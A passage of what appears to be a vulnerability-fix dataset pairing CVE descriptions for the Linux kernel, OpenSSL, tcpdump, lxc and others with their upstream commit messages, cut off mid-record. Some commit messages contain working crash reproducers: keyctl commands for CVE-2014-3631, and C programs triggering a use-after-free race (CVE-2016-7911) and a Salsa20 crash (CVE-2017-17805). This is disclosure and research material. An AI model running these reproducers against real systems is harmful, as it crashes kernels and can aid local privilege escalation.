CVE-2014-3631,,2014-09-28,"The assoc_array_gc function in the associative-array implementation in lib/assoc_array.c in the Linux kernel before 3.16.3 does not properly implement garbage collection, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via multiple ""keyctl newring"" operations followed by a ""keyctl timeout"" operation.","This fixes CVE-2014-3631.  It is possible for an associative array to end up with a shortcut node at the root of the tree if there are more than fan-out leaves in the tree, but they all crowd into the same slot in the lowest level (ie. they all have the same first nibble of their index keys).  When assoc_array_gc() returns back up the tree after scanning some leaves, it can fall off of the root and crash because it assumes that the back pointer from a shortcut (after label ascend_old_tree) must point to a normal node - which isn't true of a shortcut node at the root.  Should we find we're ascending rootwards over a shortcut, we should check to see if the backpointer is zero - and if it is, we have completed the scan.  This particular bug cannot occur if the root node is not a shortcut - ie. if you have fewer than 17 keys in a keyring or if you have at least two keys that sit into separate slots (eg. a keyring and a non keyring).  This can be reproduced by:  	ring=`keyctl newring bar @s` 	for ((i=1; i<=18; i++)); do last_key=`keyctl newring foo$i $ring`; done 	keyctl timeout $last_key 2  Doing this:  	echo 3 >/proc/sys/kernel/keys/gc_delay  first will speed things up.  If we do fall off of the top of the tree, we get the following oops:  BUG: unable to handle kernel NULL pointer dereference at 0000000000000018 IP: [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 PGD dae15067 PUD cfc24067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: xt_nat xt_mark nf_conntrack_netbios_ns nf_conntrack_broadcast ip6t_rpfilter ip6t_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables ip6table_ni CPU: 0 PID: 26011 Comm: kworker/0:1 Not tainted 3.14.9-200.fc20.x86_64 #1 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 Workqueue: events key_garbage_collector task: ffff8800918bd580 ti: ffff8800aac14000 task.ti: ffff8800aac14000 RIP: 0010:[<ffffffff8136cea7>] [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540 RSP: 0018:ffff8800aac15d40  EFLAGS: 00010206 RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffff8800aaecacc0 RDX: ffff8800daecf440 RSI: 0000000000000001 RDI: ffff8800aadc2bc0 RBP: ffff8800aac15da8 R08: 0000000000000001 R09: 0000000000000003 R10: ffffffff8136ccc7 R11: 0000000000000000 R12: 0000000000000000 R13: 0000000000000000 R14: 0000000000000070 R15: 0000000000000001 FS:  0000000000000000(0000) GS:ffff88011fc00000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b CR2: 0000000000000018 CR3: 00000000db10d000 CR4: 00000000000006f0 Stack:  ffff8800aac15d50 0000000000000011 ffff8800aac15db8 ffffffff812e2a70  ffff880091a00600 0000000000000000 ffff8800aadc2bc3 00000000cd42c987  ffff88003702df20 ffff88003702dfa0 0000000053b65c09 ffff8800aac15fd8 Call Trace:  [<ffffffff812e2a70>] ? keyring_detect_cycle_iterator+0x30/0x30  [<ffffffff812e3e75>] keyring_gc+0x75/0x80  [<ffffffff812e1424>] key_garbage_collector+0x154/0x3c0  [<ffffffff810a67b6>] process_one_work+0x176/0x430  [<ffffffff810a744b>] worker_thread+0x11b/0x3a0  [<ffffffff810a7330>] ? rescuer_thread+0x3b0/0x3b0  [<ffffffff810ae1a8>] kthread+0xd8/0xf0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40  [<ffffffff816ffb7c>] ret_from_fork+0x7c/0xb0  [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40 Code: 08 4c 8b 22 0f 84 bf 00 00 00 41 83 c7 01 49 83 e4 fc 41 83 ff 0f 4c 89 65 c0 0f 8f 5a fe ff ff 48 8b 45 c0 4d 63 cf 49 83 c1 02 <4e> 8b 34 c8 4d 85 f6 0f 84 be 00 00 00 41 f6 c6 01 0f 84 92 RIP  [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540  RSP <ffff8800aac15d40> CR2: 0000000000000018 ---[ end trace 1129028a088c0cbd ]---  Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Don Zickus <dzickus@redhat.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2014-3571,,2015-01-09,"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DTLS message that is processed with a different read operation for the handshake header than for the handshake body, related to the dtls1_get_record function in d1_pkt.c and the ssl3_read_n function in s3_pkt.c.",of the crash due to p being NULL. Steve's fix prevents this situation from occuring - however this is by no means obvious by looking at the code for dtls1_get_record. This fix just makes things look a bit more sane.  Reviewed-by: Dr Stephen Henson <steve@openssl.org>
CVE-2019-11599,CWE-667,2019-04-29,"The coredump implementation in the Linux kernel before 5.0.10 does not use locking or other mechanisms to prevent vma layout or vma flags changes while it runs, which allows local users to obtain sensitive information, cause a denial of service, or possibly have unspecified other impact by triggering a race condition with mmget_not_zero or get_task_mm calls. This is related to fs/userfaultfd.c, mm/mmap.c, fs/proc/task_mmu.c, and drivers/infiniband/core/uverbs_main.c.","The core dumping code has always run without holding the mmap_sem for writing, despite that is the only way to ensure that the entire vma layout will not change from under it.  Only using some signal serialization on the processes belonging to the mm is not nearly enough. This was pointed out earlier.  For example in Hugh's post from Jul 2017:    https://lkml.kernel.org/r/alpine.LSU.2.11.1707191716030.2055@eggly.anvils    ""Not strictly relevant here, but a related note: I was very surprised    to discover, only quite recently, how handle_mm_fault() may be called    without down_read(mmap_sem) - when core dumping. That seems a    misguided optimization to me, which would also be nice to correct""  In particular because the growsdown and growsup can move the vm_start/vm_end the various loops the core dump does around the vma will not be consistent if page faults can happen concurrently.  Pretty much all users calling mmget_not_zero()/get_task_mm() and then taking the mmap_sem had the potential to introduce unexpected side effects in the core dumping code.  Adding mmap_sem for writing around the ->core_dump invocation is a viable long term fix, but it requires removing all copy user and page faults and to replace them with get_dump_page() for all binary formats which is not suitable as a short term fix.  For the time being this solution manually covers the places that can confuse the core dump either by altering the vma layout or the vma flags while it runs.  Once ->core_dump runs under mmap_sem for writing the function mmget_still_valid() can be dropped.  Allowing mmap_sem protected sections to run in parallel with the coredump provides some minor parallelism advantage to the swapoff code (which seems to be safe enough by never mangling any vma field and can keep doing swapins in parallel to the core dumping) and to some other corner case.  In order to facilitate the backporting I added ""Fixes: 86039bd"" however the side effect of this same race condition in /proc/pid/mem should be reproducible since before 2.6.12-rc2 so I couldn't add any other ""Fixes:"" because there's no hash beyond the git genesis commit.  Because find_extend_vma() is the only location outside of the process context that could modify the ""mm"" structures under mmap_sem for reading, by adding the mmget_still_valid() check to it, all other cases that take the mmap_sem for reading don't need the new check after mmget_not_zero()/get_task_mm().  The expand_stack() in page fault context also doesn't need the new check, because all tasks under core dumping are frozen.  Link: http://lkml.kernel.org/r/20190325224949.11068-1-aarcange@redhat.com Fixes: 86039bd (""userfaultfd: add new syscall to provide memory externalization"") Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reported-by: Jann Horn <jannh@google.com> Suggested-by: Oleg Nesterov <oleg@redhat.com> Acked-by: Peter Xu <peterx@redhat.com> Reviewed-by: Mike Rapoport <rppt@linux.ibm.com> Reviewed-by: Oleg Nesterov <oleg@redhat.com> Reviewed-by: Jann Horn <jannh@google.com> Acked-by: Jason Gunthorpe <jgg@mellanox.com> Acked-by: Michal Hocko <mhocko@suse.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-13224,CWE-416,2019-07-10,"A use-after-free in onig_new_deluxe() in regext.c in Oniguruma 6.9.2 allows attackers to potentially cause information disclosure, denial of service, or possibly code execution by providing a crafted regular expression. The attacker provides a pair of a regex pattern and a string, with a multi-byte encoding that gets handled by onig_new_deluxe(). Oniguruma issues often affect Ruby, as well as common optional libraries for PHP and Rust.",
CVE-2017-13026,CWE-125,2017-09-14,"The ISO IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c, several functions.","Add bounds checks, do a common check to make sure we captured the entire subTLV, add checks to make sure the subTLV fits within the TLV.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add tests using the capture files supplied by the reporter(s), modified so the capture files won't be rejected as an invalid capture.  Update existing tests for changes to IS-IS dissector."
CVE-2017-7184,,2017-03-19,"The xfrm_replay_verify_len function in net/xfrm/xfrm_user.c in the Linux kernel through 4.10.6 does not validate certain size data after an XFRM_MSG_NEWAE update, which allows local users to obtain root privileges or cause a denial of service (heap-based out-of-bounds access) by leveraging the CAP_NET_ADMIN capability, as demonstrated during a Pwn2Own competition at CanSecWest 2017 for the Ubuntu 16.10 linux-image-* package 4.8.0.41.52.",Kees Cook has pointed out that xfrm_replay_state_esn_len() is subject to wrapping issues.  To ensure we are correctly ensuring that the two ESN structures are the same size compare both the overall size as reported by xfrm_replay_state_esn_len() and the internal length are the same.  CVE-2017-7184 Signed-off-by: Andy Whitcroft <apw@canonical.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2013-3235,CWE-200,2013-04-22,"net/tipc/socket.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure and a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The code in set_orig_addr() does not initialize all of the members of struct sockaddr_tipc when filling the sockaddr info -- namely the union is only partly filled. This will make recv_msg() and recv_stream() -- the only users of this function -- leak kernel stack memory as the msg_name member is a local variable in net/socket.c.  Additionally to that both recv_msg() and recv_stream() fail to update the msg_namelen member to 0 while otherwise returning with 0, i.e. ""success"". This is the case for, e.g., non-blocking sockets. This will lead to a 128 byte kernel stack leak in net/socket.c.  Fix the first issue by initializing the memory of the union with memset(0). Fix the second one by setting msg_namelen to 0 early as it will be updated later if we're going to fill the msg_name member.  Cc: Jon Maloy <jon.maloy@ericsson.com> Cc: Allan Stephens <allan.stephens@windriver.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-2495,CWE-264,2012-06-13,"fs/proc/base.c in the Linux kernel before 2.6.39.4 does not properly restrict access to /proc/#####/io files, which allows local users to obtain sensitive I/O statistics by polling a file, as demonstrated by discovering the length of another user's password.","/proc/PID/io may be used for gathering private information.  E.g.  for openssh and vsftpd daemons wchars/rchars may be used to learn the precise password length.  Restrict it to processes being able to ptrace the target process.  ptrace_may_access() is needed to prevent keeping open file descriptor of ""io"" file, executing setuid binary and gathering io information of the setuid'ed process.  Signed-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-3070,CWE-476,2016-08-06,"The trace_writeback_dirty_page implementation in include/trace/events/writeback.h in the Linux kernel before 4.4 improperly interacts with mm/migrate.c, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by triggering a certain page move.","clear_page_dirty_for_io() has accumulated writeback and memcg subtleties since v2.6.16 first introduced page migration; and the set_page_dirty() which completed its migration of PageDirty, later had to be moderated to __set_page_dirty_nobuffers(); then PageSwapBacked had to skip that too.  No actual problems seen with this procedure recently, but if you look into what the clear_page_dirty_for_io(page)+set_page_dirty(newpage) is actually achieving, it turns out to be nothing more than moving the PageDirty flag, and its NR_FILE_DIRTY stat from one zone to another.  It would be good to avoid a pile of irrelevant decrementations and incrementations, and improper event counting, and unnecessary descent of the radix_tree under tree_lock (to set the PAGECACHE_TAG_DIRTY which radix_tree_replace_slot() left in place anyway).  Do the NR_FILE_DIRTY movement, like the other stats movements, while interrupts still disabled in migrate_page_move_mapping(); and don't even bother if the zone is the same.  Do the PageDirty movement there under tree_lock too, where old page is frozen and newpage not yet visible: bearing in mind that as soon as newpage becomes visible in radix_tree, an un-page-locked set_page_dirty() might interfere (or perhaps that's just not possible: anything doing so should already hold an additional reference to the old page, preventing its migration; but play safe).  But we do still need to transfer PageDirty in migrate_page_copy(), for those who don't go the mapping route through migrate_page_move_mapping().  Signed-off-by: Hugh Dickins <hughd@google.com> Cc: Christoph Lameter <cl@linux.com> Cc: ""Kirill A. Shutemov"" <kirill.shutemov@linux.intel.com> Cc: Rik van Riel <riel@redhat.com> Cc: Vlastimil Babka <vbabka@suse.cz> Cc: Davidlohr Bueso <dave@stgolabs.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: Sasha Levin <sasha.levin@oracle.com> Cc: Dmitry Vyukov <dvyukov@google.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2013-3233,CWE-200,2013-04-22,"The llcp_sock_recvmsg function in net/nfc/llcp/sock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable and a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The code in llcp_sock_recvmsg() does not initialize all the members of struct sockaddr_nfc_llcp when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment.  Also, if the socket is in state LLCP_CLOSED or is shutting down during receive the msg_namelen member is not updated to 0 while otherwise returning with 0, i.e. ""success"". The msg_namelen update is also missing for stream and seqpacket sockets which don't fill the sockaddr info.  Both issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.  Fix the first issue by initializing the memory used for sockaddr info with memset(0). Fix the second one by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.  Cc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-6368,CWE-20,2013-12-14,The KVM subsystem in the Linux kernel through 3.12.5 allows local users to gain privileges or cause a denial of service (system crash) via a VAPIC synchronization operation involving a page-end address.,"In kvm_lapic_sync_from_vapic and kvm_lapic_sync_to_vapic there is the potential to corrupt kernel memory if userspace provides an address that is at the end of a page.  This patches concerts those functions to use kvm_write_guest_cached and kvm_read_guest_cached.  It also checks the vapic_address specified by userspace during ioctl processing and returns an error to userspace if the address is not a valid GPA.  This is generally not guest triggerable, because the required write is done by firmware that runs before the guest.  Also, it only affects AMD processors and oldish Intel that do not have the FlexPriority feature (unless you disable FlexPriority, of course; then newer processors are also affected).  Fixes: b93463a ('KVM: Accelerated apic support')  Reported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-7911,CWE-362,2016-11-16,Race condition in the get_task_ioprio function in block/ioprio.c in the Linux kernel before 4.6.6 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted ioprio_get system call.,"get_task_ioprio() accesses the task->io_context without holding the task lock and thus can race with exit_io_context(), leading to a use-after-free. The reproducer below hits this within a few seconds on my 4-core QEMU VM:  #define _GNU_SOURCE #include <assert.h> #include <unistd.h> #include <sys/syscall.h> #include <sys/wait.h>  int main(int argc, char **argv) { 	pid_t pid, child; 	long nproc, i;  	/* ioprio_set(IOPRIO_WHO_PROCESS, 0, IOPRIO_PRIO_VALUE(IOPRIO_CLASS_IDLE, 0)); */ 	syscall(SYS_ioprio_set, 1, 0, 0x6000);  	nproc = sysconf(_SC_NPROCESSORS_ONLN);  	for (i = 0; i < nproc; i++) { 		pid = fork(); 		assert(pid != -1); 		if (pid == 0) { 			for (;;) { 				pid = fork(); 				assert(pid != -1); 				if (pid == 0) { 					_exit(0); 				} else { 					child = wait(NULL); 					assert(child == pid); 				} 			} 		}  		pid = fork(); 		assert(pid != -1); 		if (pid == 0) { 			for (;;) { 				/* ioprio_get(IOPRIO_WHO_PGRP, 0); */ 				syscall(SYS_ioprio_get, 2, 0); 			} 		} 	}  	for (;;) { 		/* ioprio_get(IOPRIO_WHO_PGRP, 0); */ 		syscall(SYS_ioprio_get, 2, 0); 	}  	return 0; }  This gets us KASAN dumps like this:  [   35.526914] ================================================================== [   35.530009] BUG: KASAN: out-of-bounds in get_task_ioprio+0x7b/0x90 at addr ffff880066f34e6c [   35.530009] Read of size 2 by task ioprio-gpf/363 [   35.530009] ============================================================================= [   35.530009] BUG blkdev_ioc (Not tainted): kasan: bad access detected [   35.530009] -----------------------------------------------------------------------------  [   35.530009] Disabling lock debugging due to kernel taint [   35.530009] INFO: Allocated in create_task_io_context+0x2b/0x370 age=0 cpu=0 pid=360 [   35.530009] 	___slab_alloc+0x55d/0x5a0 [   35.530009] 	__slab_alloc.isra.20+0x2b/0x40 [   35.530009] 	kmem_cache_alloc_node+0x84/0x200 [   35.530009] 	create_task_io_context+0x2b/0x370 [   35.530009] 	get_task_io_context+0x92/0xb0 [   35.530009] 	copy_process.part.8+0x5029/0x5660 [   35.530009] 	_do_fork+0x155/0x7e0 [   35.530009] 	SyS_clone+0x19/0x20 [   35.530009] 	do_syscall_64+0x195/0x3a0 [   35.530009] 	return_from_SYSCALL_64+0x0/0x6a [   35.530009] INFO: Freed in put_io_context+0xe7/0x120 age=0 cpu=0 pid=1060 [   35.530009] 	__slab_free+0x27b/0x3d0 [   35.530009] 	kmem_cache_free+0x1fb/0x220 [   35.530009] 	put_io_context+0xe7/0x120 [   35.530009] 	put_io_context_active+0x238/0x380 [   35.530009] 	exit_io_context+0x66/0x80 [   35.530009] 	do_exit+0x158e/0x2b90 [   35.530009] 	do_group_exit+0xe5/0x2b0 [   35.530009] 	SyS_exit_group+0x1d/0x20 [   35.530009] 	entry_SYSCALL_64_fastpath+0x1a/0xa4 [   35.530009] INFO: Slab 0xffffea00019bcd00 objects=20 used=4 fp=0xffff880066f34ff0 flags=0x1fffe0000004080 [   35.530009] INFO: Object 0xffff880066f34e58 @offset=3672 fp=0x0000000000000001 [   35.530009] ==================================================================  Fix it by grabbing the task lock while we poke at the io_context.  Cc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Omar Sandoval <osandov@fb.com> Signed-off-by: Jens Axboe <axboe@fb.com>"
CVE-2014-4667,,2014-07-03,"The sctp_association_free function in net/sctp/associola.c in the Linux kernel before 3.15.2 does not properly manage a certain backlog value, which allows remote attackers to cause a denial of service (socket outage) via a crafted SCTP packet.","Consider the scenario: For a TCP-style socket, while processing the COOKIE_ECHO chunk in sctp_sf_do_5_1D_ce(), after it has passed a series of sanity check, a new association would be created in sctp_unpack_cookie(), but afterwards, some processing maybe failed, and sctp_association_free() will be called to free the previously allocated association, in sctp_association_free(), sk_ack_backlog value is decremented for this socket, since the initial value for sk_ack_backlog is 0, after the decrement, it will be 65535, a wrap-around problem happens, and if we want to establish new associations afterward in the same socket, ABORT would be triggered since sctp deem the accept queue as full. Fix this issue by only decrementing sk_ack_backlog for associations in the endpoint's list.  Fix-suggested-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Xufeng Zhang <xufeng.zhang@windriver.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10764,CWE-119,2019-07-27,"In the Linux kernel before 4.9.6, there is an off by one in the drivers/mtd/spi-nor/cadence-quadspi.c cqspi_setup_flash() function. There are CQSPI_MAX_CHIPSELECT elements in the ->f_pdata array so the "">"" should be "">="" instead.",There are CQSPI_MAX_CHIPSELECT elements in the ->f_pdata array so the > should be >=.  Fixes: 1406234 ('mtd: spi-nor: Add driver for Cadence Quad SPI Flash Controller') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: Marek Vasut <marex@denx.de> Signed-off-by: Cyrille Pitchen <cyrille.pitchen@atmel.com>
CVE-2018-16253,CWE-347,2018-11-07,"In sig_verify() in x509.c in axTLS version 2.1.3 and before, the PKCS#1 v1.5 signature verification does not properly verify the ASN.1 metadata. Consequently, a remote attacker can forge signatures when small public exponents are being used, which could lead to impersonation through fake X.509 certificates. This is an even more permissive variant of CVE-2006-4790 and CVE-2014-1568.",Apply patches developed by Sze Yiu which correct a vulnerability in X509 parsing.  See CVE-2018-16150 and CVE-2018-16149 for more info.
CVE-2013-3228,CWE-200,2013-04-22,"The irda_recvmsg_dgram function in net/irda/af_irda.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","The current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix that by simply setting msg_namelen to 0 as obviously nobody cared about irda_recvmsg_dgram() not filling the msg_name in case it was set.  Cc: Samuel Ortiz <samuel@sortiz.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-4558,,2016-05-23,"The BPF subsystem in the Linux kernel before 4.5.5 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted application on (1) a system with more than 32 Gb of memory, related to the program reference count or (2) a 1 Tb system, related to the map reference count.","On a system with >32Gbyte of phyiscal memory and infinite RLIMIT_MEMLOCK, the malicious application may overflow 32-bit bpf program refcnt. It's also possible to overflow map refcnt on 1Tb system. Impose 32k hard limit which means that the same bpf program or map cannot be shared by more than 32k processes.  Fixes: 1be7f75 (""bpf: enable non-root eBPF programs"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-1335,CWE-59,2015-10-01,lxc-start in lxc before 1.0.8 and 1.1.x before 1.1.4 allows local container administrators to escape AppArmor confinement via a symlink attack on a (1) mount target or (2) bind mount source.,"When a container starts up, lxc sets up the container's inital fstree by doing a bunch of mounting, guided by the container configuration file.  The container config is owned by the admin or user on the host, so we do not try to guard against bad entries.  However, since the mount target is in the container, it's possible that the container admin could divert the mount with symbolic links.  This could bypass proper container startup (i.e. confinement of a root-owned container by the restrictive apparmor policy, by diverting the required write to /proc/self/attr/current), or bypass the (path-based) apparmor policy by diverting, say, /proc to /mnt in the container.  To prevent this,  1. do not allow mounts to paths containing symbolic links  2. do not allow bind mounts from relative paths containing symbolic links.  Details:  Define safe_mount which ensures that the container has not inserted any symbolic links into any mount targets for mounts to be done during container setup.  The host's mount path may contain symbolic links.  As it is under the control of the administrator, that's ok.  So safe_mount begins the check for symbolic links after the rootfs->mount, by opening that directory.  It opens each directory along the path using openat() relative to the parent directory using O_NOFOLLOW.  When the target is reached, it mounts onto /proc/self/fd/<targetfd>.  Use safe_mount() in mount_entry(), when mounting container proc, and when needed.  In particular, safe_mount() need not be used in any case where:  1. the mount is done in the container's namespace 2. the mount is for the container's rootfs 3. the mount is relative to a tmpfs or proc/sysfs which we have    just safe_mount()ed ourselves  Since we were using proc/net as a temporary placeholder for /proc/sys/net during container startup, and proc/net is a symbolic link, use proc/tty instead.  Update the lxc.container.conf manpage with details about the new restrictions.  Finally, add a testcase to test some symbolic link possibilities.  Reported-by: Roman Fiedler Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com> Acked-by: Stéphane Graber <stgraber@ubuntu.com>"
CVE-2017-15126,CWE-119,2018-01-14,A use-after-free flaw was found in fs/userfaultfd.c in the Linux kernel before 4.13.6. The issue is related to the handling of fork failure when dealing with event messages. Failure to fork correctly can lead to a situation where a fork event will be removed from an already freed list of events with userfaultfd_ctx_put().,"When reading the event from the uffd, we put it on a temporary fork_event list to detect if we can still access it after releasing and retaking the event_wqh.lock.  If fork aborts and removes the event from the fork_event all is fine as long as we're still in the userfault read context and fork_event head is still alive.  We've to put the event allocated in the fork kernel stack, back from fork_event list-head to the event_wqh head, before returning from userfaultfd_ctx_read, because the fork_event head lifetime is limited to the userfaultfd_ctx_read stack lifetime.  Forgetting to move the event back to its event_wqh place then results in __remove_wait_queue(&ctx->event_wqh, &ewq->wq); in userfaultfd_event_wait_completion to remove it from a head that has been already freed from the reader stack.  This could only happen if resolve_userfault_fork failed (for example if there are no file descriptors available to allocate the fork uffd).  If it succeeded it was put back correctly.  Furthermore, after find_userfault_evt receives a fork event, the forked userfault context in fork_nctx and uwq->msg.arg.reserved.reserved1 can be released by the fork thread as soon as the event_wqh.lock is released.  Taking a reference on the fork_nctx before dropping the lock prevents an use after free in resolve_userfault_fork().  If the fork side aborted and it already released everything, we still try to succeed resolve_userfault_fork(), if possible.  Fixes: 893e26e (""userfaultfd: non-cooperative: Add fork() event"") Link: http://lkml.kernel.org/r/20170920180413.26713-1-aarcange@redhat.com Signed-off-by: Andrea Arcangeli <aarcange@redhat.com> Reported-by: Mark Rutland <mark.rutland@arm.com> Tested-by: Mark Rutland <mark.rutland@arm.com> Cc: Pavel Emelyanov <xemul@virtuozzo.com> Cc: Mike Rapoport <rppt@linux.vnet.ibm.com> Cc: ""Dr. David Alan Gilbert"" <dgilbert@redhat.com> Cc: Mike Kravetz <mike.kravetz@oracle.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-12896,CWE-125,2017-09-14,The ISAKMP parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c:isakmp_rfc3948_print().,This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by the reporter(s).
CVE-2017-13042,CWE-125,2017-09-14,The HNCP parser in tcpdump before 4.9.2 has a buffer over-read in print-hncp.c:dhcpv6_print().,"hncp_print_rec() validates each HNCP TLV to be within the declared as well as the on-the-wire packet space. However, dhcpv6_print() in the same file didn't do the same for the DHCPv6 options within the HNCP DHCPv6-Data TLV value, which could cause an out-of-bounds read when decoding an invalid packet. Add missing checks to dhcpv6_print().  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2015-0275,CWE-17,2015-10-19,The ext4_zero_range function in fs/ext4/extents.c in the Linux kernel before 4.1 allows local users to cause a denial of service (BUG) via a crafted fallocate zero-range request.,"Currently there is a bug in zero range code which causes zero range calls to only allocate block aligned portion of the range, while ignoring the rest in some cases.  In some cases, namely if the end of the range is past i_size, we do attempt to preallocate the last nonaligned block. However this might cause kernel to BUG() in some carefully designed zero range requests on setups where page size > block size.  Fix this problem by first preallocating the entire range, including the nonaligned edges and converting the written extents to unwritten in the next step. This approach will also give us the advantage of having the range to be as linearly contiguous as possible.  Signed-off-by: Lukas Czerner <lczerner@redhat.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2017-3733,CWE-20,2017-05-04,During a renegotiation handshake if the Encrypt-Then-Mac extension is negotiated where it was not in the original handshake (or vice-versa) then this can cause OpenSSL 1.1.0 before 1.1.0e to crash (dependent on ciphersuite). Both clients and servers are affected.,"Changing the ciphersuite during a renegotiation can result in a crash leading to a DoS attack. ETM has not been implemented in 1.1.0 for DTLS so this is TLS only.  The problem is caused by changing the flag indicating whether to use ETM or not immediately on negotiation of ETM, rather than at CCS. Therefore, during a renegotiation, if the ETM state is changing (usually due to a change of ciphersuite), then an error/crash will occur.  Due to the fact that there are separate CCS messages for read and write we actually now need two flags to determine whether to use ETM or not.  CVE-2017-3733  Reviewed-by: Richard Levitte <levitte@openssl.org>"
CVE-2016-10506,CWE-369,2017-08-30,"Division-by-zero vulnerabilities in the functions opj_pi_next_cprl, opj_pi_next_pcrl, and opj_pi_next_rpcl in pi.c in OpenJPEG before 2.2.0 allow remote attackers to cause a denial of service (application crash) via crafted j2k files.","Fixes issues with id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 and id:000019,sig:08,src:001098,op:flip1,pos:49"
CVE-2012-6638,CWE-400,2014-02-15,"The tcp_rcv_state_process function in net/ipv4/tcp_input.c in the Linux kernel before 3.2.24 allows remote attackers to cause a denial of service (kernel resource consumption) via a flood of SYN+FIN TCP packets, a different vulnerability than CVE-2012-2663.",
CVE-2017-17805,CWE-20,2017-12-20,"The Salsa20 encryption algorithm in the Linux kernel before 4.14.8 does not correctly handle zero-length inputs, allowing a local attacker able to use the AF_ALG-based skcipher interface (CONFIG_CRYPTO_USER_API_SKCIPHER) to cause a denial of service (uninitialized-memory free and kernel crash) or have unspecified other impact by executing a crafted sequence of system calls that use the blkcipher_walk API. Both the generic implementation (crypto/salsa20_generic.c) and x86 implementation (arch/x86/crypto/salsa20_glue.c) of Salsa20 were vulnerable.","When asked to encrypt or decrypt 0 bytes, both the generic and x86 implementations of Salsa20 crash in blkcipher_walk_done(), either when doing 'kfree(walk->buffer)' or 'free_page((unsigned long)walk->page)', because walk->buffer and walk->page have not been initialized.  The bug is that Salsa20 is calling blkcipher_walk_done() even when nothing is in 'walk.nbytes'.  But blkcipher_walk_done() is only meant to be called when a nonzero number of bytes have been provided.  The broken code is part of an optimization that tries to make only one call to salsa20_encrypt_bytes() to process inputs that are not evenly divisible by 64 bytes.  To fix the bug, just remove this ""optimization"" and use the blkcipher_walk API the same way all the other users do.  Reproducer:      #include <linux/if_alg.h>     #include <sys/socket.h>     #include <unistd.h>      int main()     {             int algfd, reqfd;             struct sockaddr_alg addr = {                     .salg_type = ""skcipher"",                     .salg_name = ""salsa20"",             };             char key[16] = { 0 };              algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);             bind(algfd, (void *)&addr, sizeof(addr));             